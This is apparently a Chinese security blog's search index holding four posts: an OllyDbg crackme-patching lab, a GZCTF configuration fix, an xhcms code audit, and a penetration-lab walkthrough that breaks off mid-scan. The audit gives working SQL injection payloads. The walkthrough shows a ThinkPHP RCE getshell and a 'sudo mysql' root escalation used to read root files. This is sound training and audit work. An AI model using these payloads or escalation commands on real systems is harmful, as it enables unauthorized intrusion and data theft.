<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>逆向分析实验2 OllyDbg的使用</title>
    <link href="/2025/03/01/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C2%20OllyDbg%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/03/01/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E9%AA%8C2%20OllyDbg%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向分析实验2-OllyDbg的使用"><a href="#逆向分析实验2-OllyDbg的使用" class="headerlink" title="逆向分析实验2 OllyDbg的使用"></a>逆向分析实验2 OllyDbg的使用</h1><h2 id="查找main-函数"><a href="#查找main-函数" class="headerlink" title="查找main()函数"></a>查找main()函数</h2><h3 id="单步跟踪"><a href="#单步跟踪" class="headerlink" title="单步跟踪"></a>单步跟踪</h3><p>先一直使用F8单步步过，发现运行了<code>401144</code>处的函数调用后出现弹窗：</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301095654175.png" alt="image-20250301095654175"></p><p>重新运行，并用命令<code>bp 401144</code>在目标函数位置打上断点</p><p>运行到断点后F7单步步入</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301100048067.png" alt="image-20250301100048067"></p><p>此函数中调用了<code>MessageBox()</code>函数，并且存在<code>MessageBox()</code>函数中出现的<code>Hello World!</code>和<code>www.reversecore.com</code>字符串</p><p>因此可以确定此函数为<code>main</code>函数，位置为<code>401144</code></p><h3 id="字符串检索"><a href="#字符串检索" class="headerlink" title="字符串检索"></a>字符串检索</h3><p>单击右键-&gt;查找-&gt;所有参考文本字串，找到引用“Hello World!”的地址</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301100722535.png" alt="image-20250301100722535"></p><p>双击定位到<code>main()</code>函数中调用<code>MessageBox()</code>函数的代码处，F2设置断点，F9命令运行到该处</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102443581.png" alt="image-20250301102443581"></p><p>在断点窗口查看设置的断点信息</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102230225.png" alt="image-20250301102230225"></p><p>在数据窗口中使用<code>Ctrl+G</code>，输入反汇编代码中的地址<code>4092a0</code>，查看该地址处的字符串</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102307069.png" alt="image-20250301102307069"></p><h3 id="API检索"><a href="#API检索" class="headerlink" title="API检索"></a>API检索</h3><p>单击右键-&gt;查找-&gt;所有模块间的调用，列出程序调用的所有API，找到<code>MessageBoxW()</code>的地址</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102836661.png" alt="image-20250301102836661"></p><p>双击后，定位到<code>main()</code>函数中调用<code>MessageBox()</code>函数的代码处</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301102945342.png" alt="image-20250301102945342"></p><h2 id="修改“Hello-World-”字符串"><a href="#修改“Hello-World-”字符串" class="headerlink" title="修改“Hello World!”字符串"></a>修改“Hello World!”字符串</h2><h3 id="直接修改字符串缓冲区"><a href="#直接修改字符串缓冲区" class="headerlink" title="直接修改字符串缓冲区"></a>直接修改字符串缓冲区</h3><p>用上面“字符串检索”中的方法找到<code>Hello World!</code>字符串保存的地址，在数据窗口直接编辑修改该段缓冲区的内容为<code>Hello Reversing!</code></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301104951731.png" alt="image-20250301104951731"></p><p>运行程序后，弹出消息窗口，可以看到显示出新的字符串</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301105019385.png" alt="image-20250301105019385"></p><h3 id="在其他内存区域新建字符串并传递给消息函数"><a href="#在其他内存区域新建字符串并传递给消息函数" class="headerlink" title="在其他内存区域新建字符串并传递给消息函数"></a>在其他内存区域新建字符串并传递给消息函数</h3><p>在程序未使用的NULL填充区域找到一个适当位置，写入新字符串<code>Hello Reversing World!!!</code>，并把新建的缓冲区的地址作为参数传递给<code>MessageBoxW()</code>函数</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301105752285.png" alt="image-20250301105752285"></p><p>运行程序后，弹出消息窗口，可以看到显示出新的字符串</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301105852587.png" alt="image-20250301105852587"></p><h2 id="破解abexcm1-voiees-exe程序"><a href="#破解abexcm1-voiees-exe程序" class="headerlink" title="破解abexcm1-voiees.exe程序"></a>破解abexcm1-voiees.exe程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401000 &gt;/$  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL<br>00401002  |.  68 00204000   push abexcm1-.00402000                   ; |Title = &quot;abex&#x27; 1st crackme&quot;<br>00401007  |.  68 12204000   push abexcm1-.00402012                   ; |Text = &quot;Make me think your HD is a CD-Rom.&quot;<br>0040100C  |.  6A 00         push 0x0                                 ; |hOwner = NULL<br>0040100E  |.  E8 4E000000   call &lt;jmp.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA<br>00401013  |.  68 94204000   push abexcm1-.00402094                   ; /RootPathName = &quot;c:\&quot;<br>00401018  |.  E8 38000000   call &lt;jmp.&amp;KERNEL32.GetDriveTypeA&gt;       ; \GetDriveTypeA<br>0040101D  |.  46            inc esi<br>0040101E  |.  48            dec eax<br>0040101F  |.  EB 00         jmp short abexcm1-.00401021<br>00401021  |&gt;  46            inc esi<br>00401022  |.  46            inc esi<br>00401023  |.  48            dec eax<br>00401024  |.  3BC6          cmp eax,esi<br>00401026  |.  74 15         je short abexcm1-.0040103D<br>00401028  |.  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL<br>0040102A  |.  68 35204000   push abexcm1-.00402035                   ; |Title = &quot;Error&quot;<br>0040102F  |.  68 3B204000   push abexcm1-.0040203B                   ; |Text = &quot;Nah... This is not a CD-ROM Drive!&quot;<br>00401034  |.  6A 00         push 0x0                                 ; |hOwner = NULL<br>00401036  |.  E8 26000000   call &lt;jmp.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA<br>0040103B  |.  EB 13         jmp short abexcm1-.00401050<br>0040103D  |&gt;  6A 00         push 0x0                                 ; |/Style = MB_OK|MB_APPLMODAL<br>0040103F  |.  68 5E204000   push abexcm1-.0040205E                   ; ||Title = &quot;YEAH!&quot;<br>00401044  |.  68 64204000   push abexcm1-.00402064                   ; ||Text = &quot;Ok, I really think that your HD is a CD-ROM! :p&quot;<br>00401049  |.  6A 00         push 0x0                                 ; ||hOwner = NULL<br>0040104B  |.  E8 11000000   call &lt;jmp.&amp;USER32.MessageBoxA&gt;           ; |\MessageBoxA<br>00401050  \&gt;  E8 06000000   call &lt;jmp.&amp;KERNEL32.ExitProcess&gt;         ; \ExitProcess<br></code></pre></td></tr></table></figure><p>运行源程序后会弹出消息窗口<code>Make me think your HD is a CD-Rom</code>消息，点击确定后，弹出Error消息<code>Nah…This is not a CD-ROM Drive!</code>。</p><p>我们的目的是尝试破解这个程序，使得点击确定后，弹出正确的输出。</p><p>我注意到<code>0040101F</code>有一个无意义的跳转指令（跳转到下一行指令）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0040101F  |.  EB 00         jmp short abexcm1-.00401021<br></code></pre></td></tr></table></figure><p>这个跳转指令是在第一次弹窗点击确定后、第二次弹窗之前执行的</p><p>或许可以更改跳转地址，使其直接转到弹出正确的输出的代码</p><p>更改其跳转地址为<code>0040103D</code>（弹出正确输出的代码）</p><p>成功</p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250301113056362.png" alt="image-20250301113056362"></p>]]></content>
    
    
    
    <tags>
      
      <tag>实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于GZCTF平台ip更改后题目容器ip未变的解决办法</title>
    <link href="/2025/01/12/%E5%85%B3%E4%BA%8EGZCTF%E5%B9%B3%E5%8F%B0ip%E6%9B%B4%E6%94%B9%E5%90%8E%E9%A2%98%E7%9B%AE%E5%AE%B9%E5%99%A8ip%E6%9C%AA%E5%8F%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <url>/2025/01/12/%E5%85%B3%E4%BA%8EGZCTF%E5%B9%B3%E5%8F%B0ip%E6%9B%B4%E6%94%B9%E5%90%8E%E9%A2%98%E7%9B%AE%E5%AE%B9%E5%99%A8ip%E6%9C%AA%E5%8F%98%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="关于GZCTF平台ip更改后题目容器ip未变的解决办法"><a href="#关于GZCTF平台ip更改后题目容器ip未变的解决办法" class="headerlink" title="关于GZCTF平台ip更改后题目容器ip未变的解决办法"></a>关于GZCTF平台ip更改后题目容器ip未变的解决办法</h1><p>将<code>appsettings.json</code>中的<code>PublicEntry</code>值改为当前<code>ip</code></p><p><img src="https://cl0v3.obs.cn-east-3.myhuaweicloud.com/img/blog/image-20250112115801754.png" alt="image-20250112115801754"></p><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure><p>解决。</p>]]></content>
    
    
    
    <tags>
      
      <tag>solution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xhcms代码审计</title>
    <link href="/2024/11/24/xhcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/11/24/xhcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="xhcms代码审计"><a href="#xhcms代码审计" class="headerlink" title="xhcms代码审计"></a>xhcms代码审计</h1><p>先用seay自动审计，然后一个个查看验证</p><p><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124153345463.png" alt="image-20241124153345463"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><code>/index.php</code>和<code>/admin/index.php</code>是一样的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//单一入口模式</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误显示</span><br><span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]); <span class="hljs-comment">//接收文件名</span><br><span class="hljs-variable">$action</span>=<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;index&#x27;</span>:<span class="hljs-variable">$file</span>; <span class="hljs-comment">//判断为空或者等于index</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$action</span>.<span class="hljs-string">&#x27;.php&#x27;</span>); <span class="hljs-comment">//载入相应文件</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到，前缀和后缀都写死了。</p><p>前缀<code>files/</code>可以通过<code>../</code>进行目录穿越来绕过。</p><p>后缀一般通过<code>%00</code>截断绕过，但这里有<code>addslashes</code>函数，会对NULL字符转义，所以无法使用。</p><p>这里后缀的绕过需要使用长度截断实现，但条件很苛刻</p><p>需要php版本小于<code>5.3.29</code>同时<code>Virtual Directory Support=enable</code></p><p><code>Virtual Directory Support</code>在phpstudy_pro中是默认关闭的。</p><p>总之这里对后缀的绕过在理论上是可行的，但实际上很难实现。</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>存在很多因变量未过滤导致的sql注入，同时sql报错信息会直接显示出来，可以使用报错注入。</p><p>比如在<code>/admin/files/editlink.php</code>文件中存在下列代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * FROM link WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$resul</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;SQL语句有误：&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br></code></pre></td></tr></table></figure><p>变量<code>$id</code>未经过滤，直接放在sql查询语句中</p><p>报错时会回显报错信息<code>die(&#39;SQL语句有误：&#39;.mysql_error());</code></p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://xhcms.cn/admin/?r=editlink&amp;id=1%27%20and%20(extractvalue(1,concat(0x7e,(select%20user()),0x7e)));--+<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124161819119.png" alt="image-20241124161819119"></p><p>以下文件中都存在上述问题代码，payload改一下模块名就能用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">/admin/files/editcolumn.php<br>/admin/files/editcolumn.php    <br>/admin/files/editlink.php<br>/admin/files/editsoft.php<br>/admin/files/editwz.php <br>/admin/files/reply.php<br></code></pre></td></tr></table></figure><p>还有一种是update和insert语句存在的sql注入，同样也是sql注入</p><p>比如在<code>/admin/files/imageset.php</code>文件中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$img_kg</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_kg&#x27;</span>];<br><span class="hljs-variable">$img_logo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_logo&#x27;</span>];<br><span class="hljs-variable">$img_weizhi</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_weizhi&#x27;</span>];<br><span class="hljs-variable">$img_slt</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_slt&#x27;</span>];<br><span class="hljs-variable">$img_moshi</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_moshi&#x27;</span>];<br><span class="hljs-variable">$img_wzkd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_wzkd&#x27;</span>];<br><span class="hljs-variable">$img_wzgd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;img_wzgd&#x27;</span>];<br>......<br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;UPDATE imageset SET </span><br><span class="hljs-string">img_kg=&#x27;<span class="hljs-subst">$img_kg</span>&#x27;,</span><br><span class="hljs-string"><span class="hljs-subst">$images</span></span><br><span class="hljs-string">img_weizhi=&#x27;<span class="hljs-subst">$img_weizhi</span>&#x27;,</span><br><span class="hljs-string">img_slt=&#x27;<span class="hljs-subst">$img_slt</span>&#x27;,</span><br><span class="hljs-string">img_moshi=&#x27;<span class="hljs-subst">$img_moshi</span>&#x27;,</span><br><span class="hljs-string">img_wzkd=&#x27;<span class="hljs-subst">$img_wzkd</span>&#x27;,</span><br><span class="hljs-string">img_wzgd=&#x27;<span class="hljs-subst">$img_wzgd</span>&#x27;&quot;</span>;<br>@<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;修改错误：&#x27;</span>.<span class="hljs-title function_ invoke__">mysql_error</span>());<br></code></pre></td></tr></table></figure><p>这里同样是变量未经转义和报错信息回显</p><p>只是payload和select语句中使用的不一样</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; or (select * from (select name_const(version(),1),name_const(version(),1))a) or &#x27;</span><br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124163522258.png" alt="image-20241124163522258" style="zoom: 67%;" /><p>随便选个文本框把payload填入点保存即可</p><p><img src="https://cdn.jsdelivr.net/gh/sawtooth384/image/Pic-Go/image-20241124163707931.png" alt="image-20241124163707931"></p><p>以下文件中都存在类似的问题代码，具有相似的利用方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/admin/files/imageset.php <br>/admin/files/manageinfo.php<br>/admin/files/newlink.php<br>/admin/files/reply.php<br>/admin/files/seniorset.php<br>/admin/files/seniorset.php<br>/admin/files/siteset.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-Initial</title>
    <link href="/2024/10/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
    <url>/2024/10/27/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜-Initial"><a href="#春秋云镜-Initial" class="headerlink" title="春秋云镜-Initial"></a>春秋云镜-Initial</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>打开网站，发现是个xx管理系统页面</p><p>用fscan扫一下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> D:\tools\fscan&gt; ./fscan <span class="hljs-literal">-h</span> <span class="hljs-number">39.101</span>.<span class="hljs-number">204.146</span><br><br>   ___                              _<br>  / _ \     ___  ___ _ __ __ _  ___| | __<br> / /_\/____/ __|/ __| <span class="hljs-string">&#x27;__/ _` |/ __| |/ /</span><br><span class="hljs-string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="hljs-string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="hljs-string">                     fscan version: 1.8.4</span><br><span class="hljs-string">start infoscan</span><br><span class="hljs-string">39.101.204.146:22 open</span><br><span class="hljs-string">39.101.204.146:80 open</span><br><span class="hljs-string">[*] alive ports len is: 2</span><br><span class="hljs-string">start vulscan</span><br><span class="hljs-string">[*] WebTitle http://39.101.204.146     code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="hljs-string">[+] PocScan http://39.101.204.146 poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="hljs-string">已完成 2/2</span><br><span class="hljs-string">[*] 扫描结束,耗时: 27.0242366s</span><br></code></pre></td></tr></table></figure><p>扫到个thinkphp的RCE</p><p>用<a href="https://github.com/Lotus6/ThinkphpGUI">工具</a>getshell</p><p>然后蚁剑连接</p><p>在根目录中没有找到flag</p><p>root目录权限不够进不去，flag可能在这里</p><p>于是尝试提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l       #列出当前用户可以使用 sudo 执行的命令<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">(www-data:/var/www/html) $ sudo -l<br>Matching Defaults entries for www-data on ubuntu-web01:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>User www-data may run the following commands on ubuntu-web01:<br>    (root) NOPASSWD: /usr/bin/mysql<br></code></pre></td></tr></table></figure><p>注意最后一行<code>(root) NOPASSWD: /usr/bin/mysql</code>，这说明我们可以通过<code>sudo</code>无需密码运行 <code>/usr/bin/mysql</code></p><p>利用<code>mysql</code>提权，参考<a href="https://blog.csdn.net/Bossfrank/article/details/132035121">渗透测试：Linux提权精讲（三）之sudo方法第三期</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo mysql -e &#x27;\! /bin/sh&#x27;      #启动一个具有root权限的shell会话<br></code></pre></td></tr></table></figure><p>由于蚁剑的终端是不完整的，并不是真正意义上的交互式shell，无法启动shell会话，所以执行上述语句不会有任何效果。</p><p>但我们可以将<code>/bin/sh</code>替换为我们想要执行的命令，在root目录中找到flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root&#x27;<br>flag<br>(www-data:/var/www/html) $ sudo mysql -e &#x27;\! ls /root/flag&#x27;<br>flag01.txt<br>(www-data:/var/www/html) $ sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;<br> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ <br>░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██<br> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ <br>  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         <br>   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████<br>  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██<br> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ <br>░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  <br>Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.<br>flag01: flag&#123;60b53231-<br></code></pre></td></tr></table></figure><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>接下来就要打内网了</p><p>先<code>ip a</code>看看ip:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pf">(www-data:/var/www/html) $ ip a<br><span class="hljs-number">1</span>: lo: <span class="hljs-variable">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">65536</span> qdisc noqueue <span class="hljs-keyword">state</span> UNKNOWN <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span><br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    <span class="hljs-keyword">inet6</span> ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc mq <span class="hljs-keyword">state</span> UP <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">16</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">13</span>:a1:a9 brd ff:ff:ff:ff:ff:ff<br>    <span class="hljs-keyword">inet</span> <span class="hljs-number">172.22</span>.<span class="hljs-number">1.15</span>/<span class="hljs-number">16</span> brd <span class="hljs-number">172.22</span>.<span class="hljs-number">255.255</span> scope <span class="hljs-keyword">global</span> dynamic eth0<br>       valid_lft <span class="hljs-number">315359388</span>sec preferred_lft <span class="hljs-number">315359388</span>sec<br>    <span class="hljs-keyword">inet6</span> fe80::<span class="hljs-number">216</span>:<span class="hljs-number">3</span>eff:fe13:a1a9/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>ip为<code>172.22.1.15</code></p><p>然后用蚁剑上传fscan扫描内网</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod +x fscan     #给fscan添加可执行权限<br>./fscan -h 172.22.1.0/24    #扫描从172.22.1.0到172.22.1.255的所有IP地址<br></code></pre></td></tr></table></figure><p>扫描结果默认保存在result.txt中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#result.txt</span><br>172.22.1.15:22 open<br>172.22.1.18:3306 open<br>172.22.1.21:445 open<br>172.22.1.18:445 open<br>172.22.1.2:445 open<br>172.22.1.21:139 open<br>172.22.1.18:139 open<br>172.22.1.21:135 open<br>172.22.1.2:139 open<br>172.22.1.18:135 open<br>172.22.1.18:80 open<br>172.22.1.15:80 open<br>172.22.1.2:135 open<br>172.22.1.2:88 open<br>[*] NetInfo <br>[*]172.22.1.18<br>   [-&gt;]XIAORANG-OA01<br>   [-&gt;]172.22.1.18<br>[*] NetInfo <br>[*]172.22.1.21<br>   [-&gt;]XIAORANG-WIN7<br>   [-&gt;]172.22.1.21<br>[*] NetInfo <br>[*]172.22.1.2<br>   [-&gt;]DC01<br>   [-&gt;]172.22.1.2<br>[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin<br>[+] 